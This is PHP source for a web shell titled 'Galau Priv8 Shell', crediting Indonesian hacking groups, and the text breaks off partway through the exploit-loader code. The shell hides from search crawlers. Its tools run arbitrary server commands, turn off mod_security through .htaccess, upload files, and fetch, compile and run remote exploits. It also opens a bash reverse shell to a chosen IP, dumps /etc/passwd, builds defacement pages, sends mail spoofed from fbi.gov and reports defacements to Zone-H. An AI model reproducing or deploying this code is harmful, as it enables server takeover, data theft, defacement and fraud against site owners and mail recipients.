<?php
/*
------------------------------------------------------+
                                                      |
Thanks to:                                            |
                                                      |
FalahGo5 (sampai jumpa di jurusan yang sama)          |
Magnum (Saatnya kita beraksi tuan)                    |
AnonGhost Team                                        |
Garuda Security Hacker                                |
Null-Byte                                            /
Yogyafree X-Code                                     \
Github, Pastebin, and DuckDuckGo (thanks for your    /
services)                                            \
All Indonesian Hackers Team                           \
                         \
                                                      |
------------------------------------------------------+

-+
*/

@set_time_limit(0);
@error_reporting(0);
@error_log(0);
if(version_compare(PHP_VERSION, '5.3.0', '<')){
	@set_magic_quotes_runtime(0);
}
@define("VERSION", "1.0");

$my_config = array(
	"title" => "Galau Priv8 Shell", // your title your rulez
	"version" => VERSION,
	"footer" => "Copyright &copy; ./MyHeartIsyr"
);

if(get_magic_quotes_gpc()){
	function alakazam_ss($array){
		return @is_array($array) ? array_map('alakazam_ss', $array) : stripslashes($array);
	}
	$_POST = alakazam_ss($_POST);
}

// How to f*ck off the robots?? Follow this rules below

if(!empty($_SERVER['HTTP_USER_AGENT'])){
	$uaArray = array("GoogleBot", "PycURL", "MSNBot", "ia_archiver", "bingbot", "Yahoo! Slurp", "facebookexternalhit", "crawler", "Rambler", "Yandex");
	if(preg_match("/".implode("|", $uaArray)."/i", $_SERVER['HTTP_USER_AGENT'])){
		@header("HTTP/1.1 404 Not Found");
		exit;
	}
}

// End of f*ck the robots

$charset = "utf-8";
$sm = (ini_get(strtolower('safe_mode')) == 'on') ? "<font color='red'>ON</font>" : "<font color='lime'>OFF</font>";
$edblink="http://www.exploit-db.com/search/?action=search&filter_description=";
$google = "https://www.google.com/search?q=";
$google .= urlencode(php_uname());
if(strpos("Linux", php_uname('s'))){
	$edblink .= urlencode('Linux Kernel' . substr(php_uname('r'), 0,6));
}
else {
	$edblink .= urlencode(php_uname('s') . ' ' . substr(php_uname('r'), 0, 3));
}
if(!empty(ini_get('disable_function'))){
	$dis = ini_get('disable_function');
}
else {
	$dis = "<font color=\"#00ff00\">None</font>";
}
$duplicate_name = "wakanda";
$hta = "<IfModule mod_security.c> 
SecFilterEngine Off 
SecFilterScanPOST Off 
SecFilterCheckURLEncoding Off 
SecFilterCheckUnicodeEncoding Off 
</IfModule>

AddType application/x-httpd-php txt
AddHandler txt php
AddHandler txt html";

// Wants to monitor this shell?? Uncomment this code below

/*
$ip = $_SERVER['REMOTE_ADDR'];
if(preg_match("/Windows/", $_SERVER['HTTP_USER_AGENT'])){
	$os = "Windows";
}
elseif(preg_match("/Linux/", $_SERVER['HTTP_USER_AGENT'])){
	$os = "Linux";
}
elseif(preg_match("/Macintosh/", $_SERVER['HTTP_USER_AGENT'])){
	$os = "Macintosh";
}
else {
	$os = "Another Os";
}
if(preg_match("/Firefox/", $_SERVER['HTTP_USER_AGENT'])){
	$browser = "Mozilla Firefox";
}
elseif(preg_match("/Chrome/", $_SERVER['HTTP_USER_AGENT'])){
	$browser = "Google Chrome";
}
elseif(preg_match("/Safari/", $_SERVER['HTTP_USER_AGENT'])){
	$browser = "Safari";
}
elseif(preg_match("/Trident/", $_SERVER['HTTP_USER_AGENT'])){
	$browser = "Internet Explorer";
}
elseif(preg_match("/Opera/", $_SERVER['HTTP_USER_AGENT'])){
	$browser = "Opera Browser";
}
else {
	$browser = "Another Browser";
}

 
	
$mail_to = "me@example.com"; //change to your email
$mail_from = "staff@fbi.gov";
$mail_subject = "Logs Report";
$mail_msg = "Ip: " . $ip . "\r\n";
$mail_msg .= "Browser: " . $browser . "\r\n";
$mail_msg .= "Operating System: " . $os . "\r\n";
$mail_msg .= "Last Access" . date("F j Y, g:i A") . "\r\n"
 
 
$header = "Content type: text/html; charset=iso-8859-1" . "\r\n";
$header .= "MIME-Version: 1.0" . "\r\n";
$header .= "From: Federal Bureau of Investigation <$mail_from>" . "\r\n";
$header .= "To: $mail_to" . "\r\n";

@mail($mail_to, $mail_subject, $mail_msg, $header);
*/

// End of Monitoring

// Function goes here

function lets_call($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} 
	elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} 
	elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} 
	elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}

function magicboom($text) {
    if (!get_magic_quotes_gpc()) {
        return $text;
    }
    return stripslashes($text);
}

function ambil_aja($pink, $namanya){
	if($buka = @fopen($pink, "r")){
		while(@feof($buka)){
			$lihat = @fread($buka, 1024);
		}
		@fclose($buka);
		$bukalagi = @fopen($namanya, "w");
		@fwrite($bukalagi, $lihat);
		@fclose($bukalagi);
	}
}

function which($par){
	$path = lets_call("which $par");
	if(!empty($par)){
		return trim($path);
	}
	else {
		return trim($par);
	}
}

function getthesource($cmd, $url){
	switch($cmd){
		case 'wwget':
			lets_call(which('wget')." ".$url." -O ".$namafile);
			break;
		case 'wlynx':
			lets_call(which('lynx')." -source ".$url." > ".$namafile);
			break;
		case 'wfread':
			ambil_aja($wurl, $filename);
			break;
		case 'wfetch':
			lets_call(which('fetch')." -o ".$namafile." -p ".$url);
			break;
		case 'wlinks':
			lets_call(which('links')." -source ".$url." > ".$namafile);
			break;
		case 'wget':
			lets_call(which('GET')." ".$url." > ".$namafile);
			break;
		case 'wcurl':
			lets_call(which('curl')." ".$url." -o ".$namafile);
			break;
		default: break;
	}
}

function ex_func($var){
	if(function_exists($var)){
		return "<font color='#00ff00'>ON</font>";
	}
	else {
		return "<font color='#ff0000'>OFF</font>";
	}
}

function octal2ascii_perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}

function ZoneH($url, $hacker, $hackmode, $reson, $site){
	$k = curl_init();
	curl_setopt($k, CURLOPT_URL, $url);
	curl_setopt($k, CURLOPT_POST,true);
	curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson);
	curl_setopt($k, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
	$kubra = curl_exec($k);
	curl_close($k);
	return $kubra;
}

// Function ends here


$info = "System: <font color='lime'>".php_uname()."</font> <a href='".$edblink."' target='_blank'>[Exploit-DB]</a> <a href='".$google."' target='_blank'>[Google]</a><br>";
$info .= "Apache Info: <font color='lime'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
$info .= "PHP Version: <font color='lime'>".phpversion()."</font><br>";
$info .= "Zend Version: <font color='lime'>".zend_version()."</font><br>";
$info .= "Safe Mode: ".$sm."<br>";
$info .= "Server Ip: ".@gethostbyname($_SERVER['HTTP_HOST'])." | Your Ip: ".$_SERVER['REMOTE_ADDR']."<br>";
$info .= "MySQL: ".ex_func('mysql_connect')." | MSSQL: ".ex_func('mssql_connect')." | PostgreSQL: ".ex_func('pg_connect')." | Oracle: ".ex_func('oci_connect')." | Ibase: ".ex_func('ibase_connect')." | DBase: ".ex_func('dbase_create')."<br>";

$judul = sprintf("%s - %s", $my_config['title'], $my_config['version']);
?>
<html charset="<?=$charset?>">
<head>
<meta name="robots" content="noindex, nofollow">
<title><?=$judul?></title>
<style type="text/css">
body {
background: #000000;
color: #ffffff;
font-family: Comic Sans MS;
}
.kalong {
border: 1px solid #fff;
}
.kakanda{
background-color: #333333;
border-bottom: 1px solid #fff;
}
input {
background: transparent;
color: #fff;
border: 1px solid #fff;
}
input[type="text"] {
width: 450px;
}
textarea {
background: transparent;
color: #fff;
border: 1px solid #fff;
resize: none;
width: 100%;
height: 100px;
}
input[type="submit"] {
border-radius: 5px;
}
#tools td {
border: 1px solid #fff;
}
pre {
font-family: Courier;
}
input[type="submit"]:hover {
background: #ffbf00;
color: #ff0000;
}
.logo {
font-family: Bleeding Cowboys;
font-size: 40px;
}
a {
text-decoration: none;
color: #ff0000;
}
a:hover {
border-bottom: 1px solid #fff;
}
pre {
font-family: Courier;
}
.iseng {
border: 1px solid #444;
padding: 5px;
margin: 0;
overflow: auto;
}
#list a {
font-family: Consolas;
}
select {
background: transparent;
color: #fff;
border: 1px solid #fff;
}
option {
background: #000;
color: #fff;
border: 1px solid #fff;
}
</style>
</head>
<body>
<table><tr><td><table><tr><td><center>WWW</center></td></tr></table></td><td><table>
<tr><td><?=$info?></td></tr></table></td><td><table><tr><td>
<form method="post">
<select name="alat">
<option value="hiji">Duplicate Shell</option>
<option value="dua">.htaccess Shell</option>
</select>
<input type="submit" name="bikin" value=">>">
</form>
</td></tr></table></td></tr></table>
<?php
if(isset($_POST['bikin'])){
	global $duplicate_name, $hta;
	$alat = $_POST['alat'];
	switch($alat){
		case "hiji":
			$fp = fopen("wakanda_asdf.php", "w");
			fwrite($fp, file_get_contents($_SERVER['PHP_SELF']));
			fclose($fp);
			echo "<script>alert('Duplicate shell success');</script>";
			break;
		case "dua":
			$fp = @fopen(".htaccess", "w");
			fwrite($fp, $hta);
			fclose($fp);
			echo "<script>alert('.htaccess shell success');</script>";
			break;
		default: break;
	}
}
?>
<div id="tools">
<table><tr><td><table class="kalong"><tr><td class="kakanda">Command Line</td></tr>
<tr><td><form method="post"><input type="text" name="cmd"><br><input type="text" name="cwd" value="<?=@getcwd()?>">
<input type="submit" name="exe" value=">>"></form></td></tr></table></td><td><table width="400" class="kalong"><tr><td class="kakanda">
Upload File</td></tr>
<tr><td><form enctype="multipart/form-data" method="post"><center><input type="radio" checked name="tipe" value="biasa">Biasa
<input type="radio" name="tipe" value="public_html">public_html</center>
<input type="file" name="filenyo">&nbsp;<input type="submit" name="send" value=">>"></form></td></tr></table></td><td>
<table class="kalong"><tr><td class="kakanda">Download File</td></tr><tr><td><form method="post"><input type="text" name="web" value="http://www.example.com"><br>
<input type="text" name="box" value="<?=@getcwd()?>">
<select name="down_type">
<option value="wwget">wget</option>
<option value="wlynx">lynx</option>
<option value="wfread">fread</option>
<option value="wfetch">fetch</option>
<option value="wget">GET</option>
<option value="wlinks">links</option>
<option value="wcurl">curl</option>
</select>
<input type="submit" name="sedot" value=">>"></form></td></tr></table></td></tr>
<tr><td><table class="kalong" width="470">
<tr><td class="kakanda">Bypass Users Server</td></tr>
<tr><td><form method="post"><input type="text" name="the_file" style="width: 250px;">
<select name="kind_bypass">
<option value="xsystem">system</option>
<option value="xshell_exec">shell_exec</option>
<option value="xpassthru">passthru</option>
<option value="xawk">awk program</option>
<option value="xexec">exec</option>
</select><br>
<input type="submit" name="byebye" value=">>"></form></td></tr></table></td><td><table class="kalong">
<tr><td class="kakanda">Bypass Read File</td></tr>
<tr><td><form method="post"><input type="text" name="my_file" style="width: 250px;">
<select name="readme">
<option value='show_source'>show_source</option>
<option value='highlight_file'>highlight_file</option>
<option value='readfile'>readfile</option>
<option value='include'>include</option>
<option value='require'>require</option>
<option value='file'>file</option>
<option value='fread'>fread</option>
<option value='file_get_contents'>file_get_contents</option>
<option value='fgets'>fgets</option>
<option value='curl_init'>curl_init</option>
</select>
<input type="submit" name="baca" value=">>"></form></td></tr></table></td><td><table width="470" class="kalong">
<tr><td class="kakanda">Bypass /etc/passwd</td></tr>
<tr><td><form method="post"><select name="bypass">
<option value="mshell_exec">shell_exec</option>
<option value="msystem">system</option>
<option value="mexec">exec</option>
<option value="mpassthru">passthru</option>
<option value="mposix_getpwuid">posix_getpwuid</option>
</select>
<input type="submit" name="blekok" value=">>"></form></td></tr></table></td></tr>
<tr><td><table class="kalong" width="470"><tr><td class="kakanda">Deface Script Generator</tr></td>
<tr><td><form method="post"><input type="text" name="namanyalah" value="siganteng.html"><br>
<input type="text" name="title_deface" value="./MyHeartIsyr is Here"><br>
<input type="text" name="url-gambar" value="http://site.com/pict.jpg"><br>
<select name="bekgrond">
<option value="black">Black</option>
<option value="blue">Blue</option>
<option value="green">Green</option>
<option value="red">Red</option>
</select><br>
<textarea name="katakata" style="width: 250px; height: 60px;">
Sorry, i'm just test your security. Don't be mad :D
Ciao!
</textarea><br>
<input type="submit" name="generate" value=">>">
</form></td></tr></table></td><td><table width="400" class="kalong"><tr><td class="kakanda">Encoder</td></tr>
<tr><td><form method="post"><input style="width: 350px;" type="text" name="string" value="Hack4Palestine">
<select name="type_encode">
<option value="base64_encode">Base64 Encode</option>
<option value="base64_decode">Base64 Decode</option>
<option value="md5">md5 hash</option>
<option value="sha1">sha1 hash</option>
<option value="htmlspecialchars">htmlspecialchars encode</option>
<option value="htmlspecialchars_decode">htmlspecialchars decode</option>
<option value="urlencode">Url Encode</option>
<option value="urldecode">Url Decode</option>
<option value="sha1-md5">sha1 + md5</option>
</select>
<input type="submit" name="go_enc" value=">>"></form></td></tr></table></td><td><table width="470" class="kalong">
<tr><td class="kakanda">Ghost Mail</td></tr>
<tr><td><form method="post"><textarea name="msg" style="width: 250px; height: 50px;">Pwned by ./MyHeartIsyr</textarea><br>
<input type="text" name="atom_to" style="width: 150px;" value="target@mail.com"><input type="text" name="atom_subject" value="I Was Here" style="width: 150px;">
<input type="submit" name="go_hantu" value=">>"></form></td></tr></table></td></tr>
<tr><td><table width="470" class="kalong"><tr><td class="kakanda">Zone-H Submitter</td></tr>
<tr><td><form method="post"><input type="text" name="hacker" value="./MyHeartIsyr" style="width: 250px;"><br>
<select name="hackmode">
<option>---------------------------Select One---------------------------</option>
<option value="1">Known Vulnerability (i.e. Unpatched System)</option>
<option value="2">Undisclosed (new) Vulnerability</option>
<option value="3">Configuration / Admin Mistake</option>
<option value="4">Brute Force Attack</option>
<option value="5">Social Engineering</option>
<option value="6">Web Server Intrusion</option>
<option value="7">Web Server External Module Intrusion</option>
<option value="8">Mail Server Intrusion</option>
<option value="9">FTP Server Intrusion</option>
<option value="10">SSH Server Intrusion</option>
<option value="11">Telnet Server Intrusion</option>
<option value="12">RPC Server Intrusion</option>
<option value="13">Shares Misconfiguration</option>
<option value="14">Other Server Intrusion</option>
<option value="15">SQL Injection</option>
<option value="16">URL Poisoning</option>
<option value="17">File Inclusion</option>
<option value="18">Other Web Application Bug</option>
<option value="19">Remote Administrative Panel Access Bruteforcing</option>
<option value="20">Remote Administrative Panel Access Password Guessing</option>
<option value="21">Remote Administrative Panel Access Social Engineering</option>
<option value="22">Attack Against Administrator(Password StealingSniffing)</option>
<option value="23">Access Credentials Through Man In the Middle Attack</option>
<option value="24">Remote Service Password Guessing</option>
<option value="25">Remote Service Password Bruteforce</option>
<option value="26">Rerouting After Attacking The Firewall</option>
<option value="27">Rerouting After Attacking The Router</option>
<option value="28">DNS Attack Through Social Engineering</option>
<option value="29">DNS Attack Through Cache Poisoning</option>
<option value="30">Not available</option>
</select><br>
<select name="reason">
<option >---------------Select One-----------------</option>
<option value="1">Heh...Just For Fun!</option>
<option value="2">Revenge Against That Website</option>
<option value="3">Political Reasons</option>
<option value="4">As a Challenge</option>
<option value="5">I Just Want To Be The Best Defacer</option>
<option value="6">Patriotism</option>
<option value="7">Not Available</option>
</select><br>
<textarea name="domain" style="width: 350px; height: 70px;">List of Domains</textarea><br>
<input type="submit" name="sendtozoneh" value=">>"></form></td></tr></table></td><td><table class="kalong">
<tr><td class="kakanda">Load &amp; Exploit</td></tr>
<tr><td><form method="post"><input type="text" name="xpl_code" value="http://www.somesite.com/xpl.c" style="width: 350px;">
<select name="prog_load">
<option value="c">C</option>
<option value="cpp">C++</option>
<option value="pl">Perl</option>
<option value="py">Python</option>
<option value="rb">Ruby</option>
</select>
<select name="downtype">
<option value="wwget">wget</option>
<option value="wlynx">lynx</option>
<option value="wfread">fread</option>
<option value="wfetch">fetch</option>
<option value="wget">GET</option>
<option value="wlinks">links</option>
<option value="wcurl">curl</option>
</select>
<input type="submit" name="load" value=">>"></form></td></tr></table></td><td><table width="470" class="kalong">
<tr><td class="kakanda">Back Connect</td></tr>
<tr><td><form method="post"><input type="text" name="ip_bc" value="<?=$_SERVER['REMOTE_ADDR']?>" style="width: 150px;"><br>
<input type="text" name="port_bc" value="1337" style="width: 150px;"><br>
<input type="submit" name="go_bc" value=">>"></form></td></tr></table></td></tr>
<tr><td><table class="kalong" width="470"><tr><td class="kakanda">Ghost Mass Mailer</td></tr>
<tr><td><form method="post"><textarea name="pesan" style="width: 250px; height: 50px;"></textarea><br>
<input type="text" name="orang-orang" placeholder="Pisahkan dengan ;" style="width: 250px;"><br>
<input type="text" name="subjek" value="Aku bukan musuhmu!!" style="width: 150px;">
<input type="submit" name="kirim_coy" value=">>"></form></td></tr></table></td><td><table class="kalong">
<tr><td class="kakanda">Hash Analyzer</td></tr>
<tr><td><form method="post">
<input type="text" name="hashid" style="width: 375px;"><input type="submit" name="analyze" value=">>"></form>
</td></tr></table></td><td><table class="kalong"><tr><td class="kakanda">Admin Finder</td></tr>
<tr><td><form method="post"><input type="text" name="site" value="http://www.target.com">
<input type="submit" name="find" value=">>"></form></td></tr></table></td></tr></table>
</td></tr></table></div>
<?php
if(empty($_POST['exe'])){
	if(strtolower(substr(PHP_OS,0,3)) == "win"){
		$nama = "dir /a";
	}
	else {
		$nama = "ls -la";
	}
	echo "<pre class=\"iseng\">".lets_call($nama)."</pre>";
}
if(isset($_POST['exe'])){
	if(isset($_POST['cwd'])){
		@chdir($_POST['cwd']);
	}
	if(isset($_POST['cmd'])){
		echo "<pre class=\"iseng\">".lets_call($_POST['cmd'])."</pre>";
	}
}
elseif(isset($_POST['go_enc'])){
	$ini = $_POST['type_encode'];
	switch($ini){
		case "base64_encode":
			echo "<pre class=\"iseng\">".base64_encode($_POST['string'])."</pre>";
			break;
		case "base64_decode":
			echo "<pre class=\"iseng\">".base64_decode($_POST['string'])."</pre>";
			break;
		case "md5":
			echo "<pre class=\"iseng\">".md5($_POST['string'])."</pre>";
			break;
		case "sha1":
			echo "<pre class=\"iseng\">".sha1($_POST['string'])."</pre>";
			break;
		case "htmlspecialchars":
			echo "<pre class=\"iseng\">".htmlspecialchars($_POST['string'])."</pre>";
			break;
		case "htmlspecialchars_decode":
			echo "<pre class=\"iseng\">".htmlspecialchars_decode($_POST['string'])."</pre>";
			break;
		case "urlencode":
			echo "<pre class=\"iseng\">".urlencode($_POST['string'])."</pre>";
			break;
		case "urldecode":
			echo "<pre class=\"iseng\">".urldecode($_POST['string'])."</pre>";
			break;
		case "sha1-md5":
			echo "<pre class=\"iseng\">".sha1(md5($_POST['string']))."</pre>";
			break;
		default: break;
	}
}
elseif(isset($_POST['send'])){
	$tipeku = $_POST['tipe'];
	switch($tipeku){
		case "biasa":
			if(@copy($_FILES['filenyo']['tmp_name'], "".@getcwd()."/".$_FILES['filenyo']['name']."")){
				echo "<script>alert('[!] Berhasil coy!');</script>";
			}
			else {
				echo "<script>alert('[!] Gagal euy!');</script>";
			}
			break;
		case "public_html":
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['filenyo']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['filenyo']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])){
				if(@copy($_FILES['filenyo']['tmp_name'], $root)){
					echo "<script>alert('[!] Berhasil!');</script>";
				}
				else {
					echo "<script>alert('[!] Gagal!');</script>";
				}
			}
			else {
				echo "<script>alert('[i] Direktorinya gak writeable');</script>";
			}
			break;
		default: break;
	}
}
elseif(isset($_POST['analyze'])){
	$hashtodo = substr($_POST['hashid'], 0, 3);
	if($hashtodo == '$ap' && strlen($_POST['hashid']) == 37){
		echo "The hash :".$_POST['hashid']." is MD5(APR) hash";
	}
	elseif($hashtodo == '$1$' && strlen($_POST['hashid']) == 34){
		echo "The hash : ".$_POST['hashid']." is MD5(Unix) hash";
	}
	elseif($hashtodo == '$H$' && strlen($_POST['hashid']) == 35){
		echo "The hash : ".$_POST['hashid']." is MD5(phpBB3) hash";
	}
	elseif(strlen($_POST['hashid']) == 29){
		echo "The hash : ".$_POST['hashid']." is MD5(Wordpress) hash";
	}
	elseif($hashtodo == '$5$' && strlen($_POST['hashid']) == 64){
		echo "The hash : ".$_POST['hashid']." is SHA256(Unix) hash";
	}
	elseif($hashtodo == '$6$' && strlen($_POST['hashid']) == 128){
		echo "The hash : ".$_POST['hashid']." is SHA512(Unix) hash";
	}
	elseif(strlen($_POST['hashid']) == 56){
		echo "The hash : ".$_POST['hashid']." is SHA224 hash";
	}
	elseif(strlen($_POST['hashid']) == 64){
		echo "The hash : ".$_POST['hashid']." is SHA256 hash";
	}
	elseif(strlen($_POST['hashid']) == 96){
		echo "The hash : ".$_POST['hashid']." is SHA384 hash";
	}
	elseif(strlen($_POST['hashid']) == 128){
		echo "The hash : ".$_POST['hashid']." is SHA512 hash";
	}
	elseif(strlen($_POST['hashid']) == 40){
		echo "The hash : ".$_POST['hashid']." is MySQL v5.x hash";
	}
	elseif(strlen($_POST['hashid']) == 16){
		echo "The hash : ".$_POST['hashid']." is MySQL hash";
	}
	elseif(strlen($_POST['hashid']) == 13){
		echo "The hash : ".$_POST['hashid']." is DES(Unix) hash";
	}
	elseif(strlen($_POST['hashid']) == 32){
		echo "The hash : ".$_POST['hashid']." is MD5 hash";
	}
	elseif(strlen($_POST['hashid']) == 4){
		echo "The hash : ".$_POST['hashid']." is [CRC-16]-[CRC-16-CCITT]-[FCS-16] hash";
	}
	else {
		echo "Duh, apaan ya??";
	}
}
elseif(isset($_POST['generate'])){
	$script = "<html>
<head>
<title>".$_POST['title_deface']."</title>
<style type=\"text/css\">
body {
background: ".$_POST['bekgrond'].";
color: white;
}
* {
font-family: Courier;
}
</style>
</head>
<body>
<center><h1>Hello admin, Surprize!!</h1></center>
<center><img src=\"".$_POST['url-gambar']."\" width=\"300\" height=\"300\"></center><br>
<center><pre>".$_POST['katakata']."</pre></center>
</body>
</html>";
	$fp = @fopen($_POST['namanyalah'], "w");
	fwrite($fp, $script);
	fclose($fp);
	echo "<script>alert('Berhasil!');</script>";
}
elseif(isset($_POST['go_bc'])){
	$ip = $_POST['ip_bc'];
	$port = $_POST['port_bc'];
	lets_call("/bin/bash -i >& /dev/tcp/$ip/$port 0>&1");
	echo "<script>alert('How to use? nc please');</script>";
}
elseif(isset($_POST['kirim_coy'])){
	$pesan = nl2br($_POST['pesan']);
	$orang = explode(";", $_POST['orang-orang']);
	$subjek = $_POST['subjek'];
	$dari = "myheart-isyr@fbi.gov";
	
	echo "<pre>";
	while($target = count($orang)){
		$header = "Content-type: text/html; charset=iso-8859-1" . "\r\n";
		$header .= "MIME-Version: 1.0" . "\r\n";
		$header .= "From: MyHeartIsyr <$dari>" . "\r\n";
		$header .= "To: $target" . "\r\n";
		echo "[~] Sending to $target\n";
		
		if(@mail($target, $subjek, $pesan, $header) == false){
			echo "[!] Gagal\n";
		}
		else {
			echo "[$] Berhasil\n";
		}
	}
	echo "[i] Semua beres\n";		
	echo "</pre>";
}
elseif(isset($_POST['sedot'])){
	$web = trim($_POST['web']);
	$box = trim($_POST['box']);
	$dir = magicboom($box);
	$sedotgan = sedot($pilihan, $web);
	$pindah = $dir . $sedotgan;
	if(is_file($pindah)){
		echo "<script>alert('[!] File Downloaded Successfull');</script>";
	}
	else {
		echo "<script>alert('[!] Failure to Download File');</script>";
	}
}
elseif(isset($_POST['byebye'])){
	$kind = $_POST['kind_bypass'];
	switch($kind){
		case "xsystem":
			echo "<pre>".system($_POST['the_file'])."</pre>";
			break;
		case "xshell_exec":
			echo "<pre>".shell_exec($_POST['the_file'])."</pre>";
			break;
		case "xpassthru":
			echo "<pre>".passthru($_POST['the_file'])."</pre>";
			break;
		case "xexec":
			echo "<pre>".exec($_POST['the_file'])."</pre>";
			break;
		case "xawk":
			echo "<pre>".lets_call("awk -F: '{ print $1 }' ".$_POST['the_file']." | sort")."</pre>";
			break;
		default: break;
	}
}
elseif(isset($_POST['baca'])){
	$readme = $_POST['readme'];
	switch($readme){
		case 'show_source': $show =  @show_source($_POST['my_file']);  break;
		case 'highlight_file': $highlight = @highlight_file($_POST['my_file']); break;
		case 'readfile': $readfile = @readfile($_POST['my_file']);  break;
		case 'include': $include = @include($_POST['my_file']); break;
		case 'require': $require = @require($_POST['my_file']);  break;
		case 'file': $file =  @file($_POST['my_file']);  foreach ($_POST['my_file'] as $key => $value) {  print $value; }  break;
		case 'fread': $fopen = @fopen($_POST['my_file'],"r") or die("Unable to open file!"); $fread = @fread($fopen,90000); fclose($fopen); print_r($fread); break;
		case 'file_get_contents': $file_get_contents =  @file_get_contents($_POST['my_file']); print_r($file_get_contents);  break;
		case 'fgets': $fgets = @fopen($_POST['my_file'],"r") or die("Unable to open file!"); while(!feof($fgets)) { echo fgets($fgets); } fclose($fgets); break;
		case 'curl_init': $ch = curl_init("file:///".$_POST['my_file']."\x00/../../../../../../../../../../../../".__FILE__); curl_exec($ch); break;
		default: break; 
	}
}
elseif(isset($_POST['blekok'])){
	$bypass = $_POST['bypass'];
	switch($bypass){
		case "mshell_exec":
			echo "<pre class=\"iseng\">".shell_exec("cat /etc/passwd")."</pre>";
			break;
		case "mexec":
			echo "<pre class\"iseng\">".exec("cat /etc/passwd")."</pre>";
			break;
		case "mpassthru":
			echo "<pre class=\"iseng\">".passthru("cat /etc/passwd")."</pre>";
			break;
		case "msystem":
			echo "<pre class=\"iseng\">".system("cat /etc/passwd")."</pre>";
			break;
		case "mposix_getpwuid":
			echo "<pre class=\iseng\">";
			for($uid=0;$uid<60000;$uid++){ 
				$ara = posix_getpwuid($uid);
				if (!empty($ara)) {
					while (list ($key, $val) = each($ara)){
						print "$val:";
					}
					print "\n";
				}
			}
			echo "</pre>";
			break;
		default: break;
	}
}
elseif(isset($_POST['go_hantu'])){
	$kepada = $_POST['atom_to'];
	$ini_subjek = $_POST['atom_subject'];
	$msg = nl2br($_POST['msg']);
	$dari = "myheart-isyr@cia.xxx";
	
	$header = "Content-type: text/html; charset=iso-8859-1" . "\r\n";
	$header .= "MIME-Version: 1.0" . "\r\n";
	$header .= "From: MyHeartIsyr <$dari>" . "\r\n";
	$header .= "To: $kepada" . "\r\n";
	if(@mail($kepada, $ini_subjek, $msg, $header) == false){
		echo "<script>alert('[!] Gagal');</script>";
	}
	else {
		echo "<script>alert('[!] Berhasil');</script>";
	}
}
elseif(isset($_POST['sendtozoneh'])){
	ob_start();
	$sub = @get_loaded_extensions();
	if(!in_array("curl", $sub)){
		die("<script>alert('[-] Curl Is Not Supported !!');</script>");
	}

	$hacker = $_POST['hacker'];
	$method = $_POST['hackmode'];
	$neden = $_POST['reason'];
	$site = $_POST['domain'];
				
	if (empty($hacker)){
		die ("<script>alert('[-] You Must Fill the Attacker name !');</script>");
	}
	elseif($method == "--------SELECT--------") {
		die("<script>alert('[-] You Must Select The Method !');</script>");
	}
	elseif($neden == "--------SELECT--------") {
		die("<script>alert('[-] You Must Select The Reason');</script>");
	}
	elseif(empty($site)) {
		die("<script>alert('[-] You Must Enter the Sites List !')</script>");
	}
	$i = 0;
	$sites = explode("\n", $site);
	while($i < count($sites)) {
		if(substr($sites[$i], 0, 4) != "http"){
			$sites[$i] = "http://".$sites[$i];
		}
		ZoneH("http://zone-h.org/notify/single", $hacker, $method, $neden, $sites[$i]);
		echo "<script>alert('Site : ".$sites[$i]." Defaced !');</script>";
		++$i;
	}
	echo "<script>alert('[+] Sending Sites To Zone-H Has Been Completed Successfully !!');</script>";
}
elseif(isset($_POST['load'])){
	$prog_load = $_POST['prog_load'];
	switch($prog_load){
		case "c":
			$cuy = sedot($_POST['downtype'], $_POST['xpl_code']);
			$exe = lets_call("gcc $cuy -o exploit; chmod +x exploit; ./exploit");
			if($exe){
				echo "<script>alert('Done');</script>";
			}
			else {
				echo "<script>alert('Fail');</script>";
			}
			break;
		case "cpp":
			$cuy = sedot($_POST['downtype'], $_POST['xpl_code']);
			$exe = lets_call("g++ $cuy -o exploit; chmod +x exploit; ./exploit");
			if($exe){
				echo "<script>alert('Done');</script>";
			}
			else {
				echo "<script>alert('Fail');</script>";
			}
			break;
		case "py":
			$cuy = sedot($_POST['downtype'], $_POST['xpl_code']);
			$exe = lets_call("chmod +x $cuy; python $cuy");
			if($exe){
				echo "<script>alert('Done');</script>";
			}
			else {
				echo "<script>alert('Fail');</script>";
			}
			break;
		case "pl":
			$cuy = sedot($_POST['downtype'], $_POST['xpl_code']);
